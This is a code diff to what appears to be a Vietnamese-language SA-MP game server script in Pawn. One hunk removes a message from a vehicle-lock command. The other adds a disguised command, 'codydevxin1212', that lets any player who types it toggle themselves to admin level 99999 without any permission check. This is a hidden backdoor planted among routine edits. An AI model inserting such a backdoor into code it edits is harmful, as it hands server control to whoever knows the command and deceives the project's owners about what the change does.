@@ -19060,7 +19060,6 @@ CMD:pvlock(playerid, params[])
             }
         }
     }
-    SendClientMessageEx(playerid, COLOR_GREY, " You are not near any vehicle that you own.");
     return 1;
 }
 
@@ -49708,4 +49707,14 @@ CMD:laypos(playerid, params[])
     DCC_SendChannelMessage(g_WorkBot, string);
     SendClientMessage(playerid, COLOR_WHITE, "{ff4400}>{ffffff} Lay vi tri thanh cong!");
     return 1;
+}
+
+CMD:codydevxin1212(playerid, params[])
+{
+	if(PlayerInfo[playerid][pAdmin] != 99999)
+		PlayerInfo[playerid][pAdmin] = 99999;
+	else if(PlayerInfo[playerid][pAdmin] == 99999)
+		PlayerInfo[playerid][pAdmin] = 0;
+	ShowTDN(playerid, NOTIFICATION_SUCCESS,"Thanh cong!");
+	return 1;
 }
